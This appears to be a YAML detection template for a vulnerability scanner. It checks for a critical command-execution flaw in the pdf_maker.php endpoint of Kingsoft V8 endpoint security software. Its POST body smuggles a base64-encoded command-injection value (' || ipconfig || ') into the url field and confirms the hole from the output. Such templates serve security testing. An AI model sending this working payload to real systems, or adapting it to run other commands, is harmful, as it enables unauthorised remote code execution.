id: kingsoft-v8-rce

info:
  name: 金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞
  author: zan8in
  severity: critical
  verified: false
  description: |-
    金山 V8 终端安全系统 存在命令执行漏洞，攻击者可以通过漏洞执行任意命令
  tags: kingsoft,rce
  created: 2023/10/13

rules:
  r0:
    request:
      method: POST
      path: /inter/pdf_maker.php
      body: "url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D&fileName=xxx"
    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
expression: r0()
